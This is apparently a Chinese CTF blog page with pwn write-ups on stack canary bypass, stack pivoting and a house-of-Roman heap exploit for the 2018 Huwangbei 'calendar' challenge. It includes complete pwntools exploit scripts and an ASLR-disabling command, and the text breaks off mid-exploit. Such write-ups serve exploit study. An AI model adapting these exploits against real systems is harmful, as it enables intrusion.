-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
   
-    <article id="post-rop" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="浅析栈溢出遇到的两种坑及绕过技巧"><a href="#浅析栈溢出遇到的两种坑及绕过技巧" class="headerlink" title="浅析栈溢出遇到的两种坑及绕过技巧"></a>浅析栈溢出遇到的两种坑及绕过技巧</h1><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>对于刚开始入门pwn的萌新来说可能会遇到一些坑，这里我就来总结一下我之前做栈溢出的时候遇到的两种坑以及绕过技巧，具体我会通过例题来讲解，希望对此时正在入门的pwn的萌新能带来一些帮助。</p>
-<h1 id="0x01绕过canary"><a href="#0x01绕过canary" class="headerlink" title="0x01绕过canary"></a>0x01绕过canary</h1><p>canary是linux下的保护机制，它会保存在栈的某个位置上，一般来说64位的话会在rbp-0x8的位置，32位则在ebp-0x4的位置。当我们进行栈溢出的时候如果覆盖了canary值，程序就会调用<strong>stack_chk_fail</strong>来打印报错信息。在做题的时候最烦的就是这种，大大增加了栈溢出时的难度。通常有以下几种绕过方法：</p>
-<p><strong>1、通过read函数泄露canary。</strong>关键的一点就是read函数读取字符串的时候不会在末尾加上“\x00”,这就是gets函数不能用来泄露canary的原因（有些输出函数遇到‘\0’会截断）。</p>
-<p><strong>2、暴力破解canary。</strong>这种方法利用起来有限制，就是一般要程序中有fork函数创造出子进程，因为子进程是父进程复制出来的，所以canary也就跟父进程相同，在子进程中覆盖canary后报错就会退回到父进程，此时canary的值是不会改变的。</p>
-<p><strong>3、劫持stack_chk_fail。</strong>因为canary被覆盖的时候会调用这个函数，所以如果我们可以利用程序中的漏洞（比如格式化字符串）改got表中<strong>stack_chk_fail</strong>的地址为one_gadget的地址就能getshell。</p>
-<p><strong>4、利用stack_chk_fail的报错信息。</strong>在报错信息中，会将你发生栈溢出的程序名调用输出，其位置位于argv[0]，我们可以将argv[0]的地址改写为我们想要获取的内容的地址，使它随着错误提示一起输出。</p>
-<p>这里我主要是介绍第一种方法</p>
-<h2 id="“百度杯”-十二月场-easypwn"><a href="#“百度杯”-十二月场-easypwn" class="headerlink" title="“百度杯” 十二月场 easypwn"></a>“百度杯” 十二月场 easypwn</h2><p>1、我们来简单运行一下并看一下它的保护，这里主要开启了NX和canary保护。</p>
-<p><img src="/2018/11/20/rop/1.jpg" alt="1"></p>
-<p><img src="/2018/11/20/rop/2.png" alt="2"></p>
-<p>2、用ida打开反编译，这个程序比较简单，有两处栈溢出，第一处栈溢出主要利用read函数泄露canary，第二处就可以正常地ROP了。</p>
-<p><img src="/2018/11/20/rop/3.png" alt="3"></p>
-<p>3、我们来看一下它的栈结构，buf在rbp-0x50的位置，而canary在rbp-0x8的位置，偏移为0x48.</p>
-<p><img src="/2018/11/20/rop/4.png" alt="4"></p>
-<p><img src="/2018/11/20/rop/5.jpg" alt="5"></p>
-<p><img src="/2018/11/20/rop/6.jpg" alt="6"></p>
-<p>4、这里我们可以构造0x48个a字符，因为末尾没有‘\0’，所以调用printf函数的时候就会把后面的canary泄露出来，这里要普及的一个知识点就是canary最低一个字节是“\x00”，所以泄露出来之后要减去0xa。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(&apos;Who are you?\n&apos;)</span><br><span class="line">io.sendline(&apos;a&apos;*0x48)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&apos;a&apos;*0x48)</span><br><span class="line">canary=u64(io.recv(8))-0xa</span><br><span class="line">print hex(canary)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/11/20/rop/7.jpg" alt="7"></p>
-<p>5、接下来要用到的是syscall系统调用的情况，调用号是0x3b就是execve()函数，利用read函数的返回值使得rax为0x3b，因为这主要讲的是canary，在这里就不详述系统调用了，下面贴上完整exp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.binary = &apos;./easypwn&apos;</span><br><span class="line">context.terminal = [&apos;tmux&apos;,&apos;sp&apos;,&apos;-h&apos;]</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">elf = ELF(&apos;./easypwn&apos;)</span><br><span class="line">io = process(&apos;./easypwn&apos;)</span><br><span class="line">#io = remote(&apos;106.75.66.195&apos;, 20000)</span><br><span class="line">#leak Canary</span><br><span class="line">io.recvuntil(&apos;Who are you?\n&apos;)</span><br><span class="line">io.sendline(&apos;a&apos;*0x48)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&apos;a&apos;*0x48)</span><br><span class="line">canary=u64(io.recv(8))-0xa</span><br><span class="line">print hex(canary)</span><br><span class="line">log.info(&apos;canary:&apos;+hex(canary))</span><br><span class="line">#leak read_addr</span><br><span class="line">io.recvuntil(&apos;tell me your real name?\n&apos;)</span><br><span class="line">payload = &apos;A&apos;*(0x50-0x8)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += &apos;A&apos;*0x8</span><br><span class="line">payload += p64(0x4007f3)</span><br><span class="line">payload += p64(elf.got[&apos;read&apos;])</span><br><span class="line">payload += p64(elf.plt[&apos;puts&apos;])</span><br><span class="line">payload += p64(0x4006C6)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&apos;See you again!\n&apos;)</span><br><span class="line">#cacl syscall_addr</span><br><span class="line">read_addr = u64(io.recvuntil(&apos;\n&apos;,drop=True).ljust(0x8,&apos;\x00&apos;))</span><br><span class="line">print &apos;read_addr:&apos;+hex(read_addr)</span><br><span class="line">syscall = read_addr+0xe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.info(&apos;syscall:&apos;+hex(syscall))</span><br><span class="line">sleep(0.5)</span><br><span class="line">io.recvuntil(&apos;Who are you?\n&apos;)</span><br><span class="line">io.sendline(&apos;A&apos;*(0x50-0x8))</span><br><span class="line"></span><br><span class="line">io.recvuntil(&apos;tell me your real name?\n&apos;)</span><br><span class="line">payload = &apos;A&apos;*(0x50-0x8)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += &apos;A&apos;*0x8</span><br><span class="line">payload += p64(0x4007EA)</span><br><span class="line">payload += p64(0)+p64(1)+p64(elf.got[&apos;read&apos;])+p64(0x3B)+p64(0x601018)+p64(0)</span><br><span class="line">payload += p64(0x4007D0)</span><br><span class="line">payload += p64(0)</span><br><span class="line">payload += p64(0)+p64(1)+p64(0x601020)+p64(0)+p64(0)+p64(0x601018)</span><br><span class="line">payload += p64(0x4007D0)</span><br><span class="line">io.send(payload)</span><br><span class="line">sleep(0.5)</span><br><span class="line"></span><br><span class="line">content = &apos;/bin/sh\x00&apos;+p64(syscall)</span><br><span class="line">content = content.ljust(0x3B,&apos;0&apos;)</span><br><span class="line">io.send(content)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="0x02栈迁移"><a href="#0x02栈迁移" class="headerlink" title="0x02栈迁移"></a>0x02栈迁移</h1><p>我们在做栈溢出的时候经常会遇到这样的问题，就是溢出的长度不够，这时候需要把栈迁移到我们能够控制的空间里去。这里主要用到汇编语言里的leave ret，我们来看一下leave，在64位下相当于</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rsp,rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure>
-<p>就是说我们只要通过栈溢出控制了rbp，就能控制rsp，把栈迁移到我们想要的空间。这里有一个可能有误会的就是这个mov rsp,rbp，这个rbp指的是rbp的值，而不是我们要覆盖的rbp的值，后面的pop  rbp才是把我们覆盖的值，即rbp锁指向的栈空间的值赋值给rsp。</p>
-<h2 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h2><p>这个题目是xman夏令营个人排位赛的一道pwn题（task_main_p3IegA3）</p>
-<p>1、还是老样子先运行一遍再看保护，这里只开启了NX保护</p>
-<p><img src="/2018/11/20/rop/8.jpg" alt="8"></p>
-<p><img src="/2018/11/20/rop/9.jpg" alt="9"></p>
-<p>2、ida反编译看下，这个程序非常简单，就只有几行代码，第一次输入保存在bss段，第二次输入在栈上，溢出的长度只能刚好覆盖到返回地址。。这时就需要我们把栈迁移到bss段上。</p>
-<p><img src="/2018/11/20/rop/10.jpg" alt="10"></p>
-<p>3、我们先用ROPgadget工具找到合适gadget，0x40060f就是我们想要的。</p>
-<p><img src="/2018/11/20/rop/11.jpg" alt="11"></p>
-<p>4、我们先来控制栈，我们不能把栈迁移到bss段一开始的地方，所以这里buf是我们输入的bss段+0x100的地址，因为程序本身就会执行leave ret汇编，执行的时候pop rbp，所以会把rbp移到bss段。但是此时rsp还留在栈上，所以我们把gadget填到返回地址就行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;stack:\n&apos;)</span><br><span class="line">payload1=&apos;a&apos;*10+p64(buf)+p64(leve_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br></pre></td></tr></table></figure>
-<p>5、下一步就是布置bss段上的数据，可以看出，栈已经被迁移到bss段了，这里会输出puts的地址。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=&apos;A&apos;*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;bss:\n&apos;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/11/20/rop/12.png" alt="12"></p>
-<p>6、最后一步只需要把one_gadget填到返回地址就行啦。附上完整exp。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level=True</span><br><span class="line">p=process(&apos;./task_main_p3IegA3&apos;)</span><br><span class="line">#p=remote()</span><br><span class="line">elf=ELF(&apos;task_main_p3IegA3&apos;)</span><br><span class="line">libc=ELF(&apos;libc.so.6&apos;)</span><br><span class="line">buf=elf.bss()+0x20+0X100</span><br><span class="line">print hex(buf)</span><br><span class="line">puts_plt=elf.plt[&apos;puts&apos;]</span><br><span class="line">puts_got=elf.got[&apos;puts&apos;]</span><br><span class="line">read_plt=elf.plt[&apos;read&apos;]</span><br><span class="line">main=0x040061D</span><br><span class="line"></span><br><span class="line">leve_ret=0x040060F</span><br><span class="line">popret=0x0400693</span><br><span class="line"></span><br><span class="line">payload=&apos;A&apos;*0x100+p64(buf)+p64(popret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;bss:\n&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;stack:\n&apos;)</span><br><span class="line">payload1=&apos;a&apos;*10+p64(buf)+p64(leve_ret)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">#p.recv()</span><br><span class="line"></span><br><span class="line">putsadd=u64(p.recvuntil(&apos;\n&apos;,drop=True).ljust(0x8,&apos;\x00&apos;))</span><br><span class="line">print hex(putsadd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = putsadd- libc.sym[&apos;puts&apos;]</span><br><span class="line">one_gadget = libc_base + 0x4526a</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&quot;1&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">pay= 18*&apos;a&apos; + p64(one_gadget)</span><br><span class="line">p.send(pay)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/11/20/rop/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-calendar" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/18/calendar/">calendar</a>
-    </h1>
   
 
-        
-        <a href="/2018/10/18/calendar/" class="archive-article-date">
-  	<time datetime="2018-10-18T05:11:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-10-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="（首发自安全客）2018护网杯calendar-WP-萌新向"><a href="#（首发自安全客）2018护网杯calendar-WP-萌新向" class="headerlink" title="（首发自安全客）2018护网杯calendar WP(萌新向)"></a>（首发自安全客）2018护网杯calendar WP(萌新向)</h1><h2 id="原文戳这里https-www-anquanke-com-post-id-162121"><a href="#原文戳这里https-www-anquanke-com-post-id-162121" class="headerlink" title="原文戳这里https://www.anquanke.com/post/id/162121"></a>原文戳这里<a href="https://www.anquanke.com/post/id/162121" target="_blank" rel="noopener">https://www.anquanke.com/post/id/162121</a></h2><p>护网杯结束也有一段时间了（被虐惨了。。），各位大佬战队的WP也相继出炉，不过部分题目的WP不够详细，对于刚入门的小白来说可能会有点难看懂。今天有空就来写下pwn题calendar的wp，也刚好做个笔记吧。讲到这题，很遗憾，我是赛后才复现出来的，因为当时有各种细节没处理好，而且远程爆破也是讲究玄学的，这也许就是这道题目值800分所在吧。</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>其实这题最坑的就是没办法泄露出libc，要利用house of Roman爆破12 bit来getshell。首先fastbin attack使得malloc hook可以任意写，修复fastbin后利用unsorted bin attack使malloc hook指向main_arena+88的地方，最后利用uaf部分地址写把one_gadget的低三字节写入malloc hook，本地调试的时候可以把ASLR关了，接着就剩玄学的远程爆破了。</p>
-<h3 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h3><h4 id="1、先简单运行一下程序，查看保护。"><a href="#1、先简单运行一下程序，查看保护。" class="headerlink" title="1、先简单运行一下程序，查看保护。"></a>1、先简单运行一下程序，查看保护。</h4><p>这里主要开启了canary和nx保护，不能改写got表</p>
-<p><img src="/2018/10/18/calendar/1.png" alt="1"></p>
-<p><img src="/2018/10/18/calendar/1539688636223.png" alt="1539688636223"></p>
-<h4 id="2、ida打开，反编译。"><a href="#2、ida打开，反编译。" class="headerlink" title="2、ida打开，反编译。"></a>2、ida打开，反编译。</h4><p>1、这里主要有add()，edit()和remove()函数，并没有可以泄露的show()函数</p>
-<p><img src="/2018/10/18/calendar/1539688897366.png" alt="1539688897366"></p>
-<p>2、edit()里面有个offbyone漏洞，还有一个关键的地方就是，可以edit空闲的chunk</p>
-<p><img src="/2018/10/18/calendar/1539689298813.png" alt="1539689298813"></p>
-<p>3、remove()里面free后没有置0，有个uaf漏洞</p>
-<p><img src="/2018/10/18/calendar/1539691627426.png" alt="1539691627426"></p>
-<h4 id="3、本地调试"><a href="#3、本地调试" class="headerlink" title="3、本地调试"></a>3、本地调试</h4><p>1、先把堆栈随机化关了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539692002497.png" alt="1539692002497"></p>
-<p>2、找出libc和它的基地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&apos;input calendar name&gt; &apos;)</span><br><span class="line"></span><br><span class="line">p.sendline(&apos;123&apos;)</span><br><span class="line">add(1,0x68)</span><br><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
-<p>malloc hook地址为0x7ffff7dd1b10 ，所以基地址为0x7ffff7a0d000</p>
-<p><img src="/2018/10/18/calendar/1539692472237.png" alt="1539692472237"></p>
-<h4 id="4、fastbin-attack"><a href="#4、fastbin-attack" class="headerlink" title="4、fastbin attack"></a>4、fastbin attack</h4><p>1、因为没有show()，所以只能利用uaf改fastbin chunk的fd指针。先申请3个0x70，由于add()里只能输入最大是0x68，所以利用edit的offbyone漏洞改chunk2的size，然后再free进入unsorted bin。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(1,0x10)</span><br><span class="line">add(1,0x60)</span><br><span class="line">add(1,0x68)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(2,0x68)</span><br><span class="line">add(3,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">edit(3,0x60,p64(0)*2+p64(0x90)+p64(0x51)+&apos;\n&apos;)</span><br><span class="line">edit(1,0x68,&apos;a&apos;*0x68+chr(0x91))</span><br><span class="line"></span><br><span class="line">dele(2)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539693738031.png" alt="1539693738031"></p>
-<p>2、edit把size改回，再free两个chunk，利用edit和UAF部分写改chunk3的fd为上面free掉的unsorted bin中的chunk2，这样fastbin–&gt;chunk3–&gt;chunk2–&gt;main_arena+88，接着把chunk2的fd改成malloc hook-0x13。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">edit(1,0x68,&apos;a&apos;*0x68+chr(0x71))</span><br><span class="line">dele(1)</span><br><span class="line">dele(3)</span><br><span class="line">edit(3,1,chr(0x70)+chr(0x70))</span><br><span class="line">	</span><br><span class="line">edit(2,1,chr(0xfd)+chr(0x1a))</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539694434288.png" alt="1539694434288"></p>
-<p>3、申请3个块，chunk3就被分配到了malloc hook-0x13的地方，到时候把malloc hook改成one_gadget就行，接着free掉chunk4进入fastbin，edit把它的fd指针改成0，修复fastbin（如果不修复无法进行下面的unsorted bin attack）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(1,0x60)</span><br><span class="line">add(4,0x60)</span><br><span class="line">add(3,0x60)</span><br><span class="line">dele(4)</span><br><span class="line">edit(4,7,p64(0))</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539694862318.png" alt="1539694862318"></p>
-<h4 id="5、unsorted-bin-attack"><a href="#5、unsorted-bin-attack" class="headerlink" title="5、unsorted bin attack"></a>5、unsorted bin attack</h4><p>由上面的图可以看出，fastbin和unsorted bin都指向同一个块，这时我们就可以申请chunk1就可以改unsorted bin的bk指针为malloc hook-0x10，再申请一个0x60的时候块的时候malloc hook就会指向main_arena+88</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(1,0x60)		</span><br><span class="line">edit(1,9,p64(0)+chr(0x00)+chr(0x1b))	</span><br><span class="line">add(1,0x60)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539695515617.png" alt="1539695515617"></p>
-<h4 id="6、改malloc-hook为one-gadget"><a href="#6、改malloc-hook为one-gadget" class="headerlink" title="6、改malloc hook为one_gadget"></a>6、改malloc hook为one_gadget</h4><p>这时候我们edit chunk3就可以改malloc hook的低3字节为one_gadget，有些one_gadget会失败，这时选一个合适的one_gadget就行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">one=0xf66f0</span><br><span class="line">#one = 0xcd0f3</span><br><span class="line">#one = 0x4526a</span><br><span class="line">#one = 0xf02a4</span><br><span class="line">one_gadget =libcbase+one</span><br><span class="line">edit(3,5,&apos;aaa&apos;+p64(one_gadget)[0:3])</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539695866768.png" alt="1539695866768"></p>
-<h4 id="7、触发one-gadget"><a href="#7、触发one-gadget" class="headerlink" title="7、触发one_gadget"></a>7、触发one_gadget</h4><p>free掉同一个chunk由于double free会报错，这时会调用malloc hook触发one_gadget</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dele(4)</span><br><span class="line">dele(4)</span><br></pre></td></tr></table></figure>
-<p><img src="/2018/10/18/calendar/1539696162744.png" alt="1539696162744"></p>
-<h4 id="8、远程爆破"><a href="#8、远程爆破" class="headerlink" title="8、远程爆破"></a>8、远程爆破</h4><p>这时候再写个远程爆破的脚本就可以进行远程爆破。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	</span><br><span class="line">	while True:</span><br><span class="line">		try:	</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			p = process(&apos;./task_calendar&apos;, env = &#123;&apos;LD_PRELOAD&apos; : &apos;./libc6_2.23-0ubuntu10_amd64.so&apos;&#125;)</span><br><span class="line">				</span><br><span class="line">			</span><br><span class="line">			#p = remote(&apos;117.78.40.144&apos;, 31274)</span><br><span class="line">			exp(p)</span><br><span class="line">			break</span><br><span class="line">		except Exception as e:</span><br><span class="line">			# raise e</span><br><span class="line">			p.close()</span><br></pre></td></tr></table></figure>
-<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot; ,endian = &apos;little&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;task_calendar&apos;)</span><br><span class="line">libc=ELF(&apos;libc6_2.23-0ubuntu10_amd64.so&apos;)</span><br><span class="line">def add(p,id,leng):</span><br><span class="line">	p.recvuntil(&apos;choice&gt; &apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;choice&gt; &apos;)</span><br><span class="line">	p.sendline(str(id))</span><br><span class="line">	p.recvuntil(&apos;size&gt; &apos;)</span><br><span class="line">	p.sendline(str(leng))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def edit(p,id,size,x):</span><br><span class="line">	p.recvuntil(&apos;choice&gt; &apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;choice&gt; &apos;)</span><br><span class="line">	p.sendline(str(id))</span><br><span class="line">	p.recvuntil(&apos;size&gt; &apos;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&apos;info&gt; &apos;)</span><br><span class="line">	p.send(x)</span><br><span class="line">		</span><br><span class="line">def dele(p,id):</span><br><span class="line">	p.recvuntil(&apos;choice&gt; &apos;)</span><br><span class="line">	p.sendline(&apos;3&apos;)</span><br><span class="line">	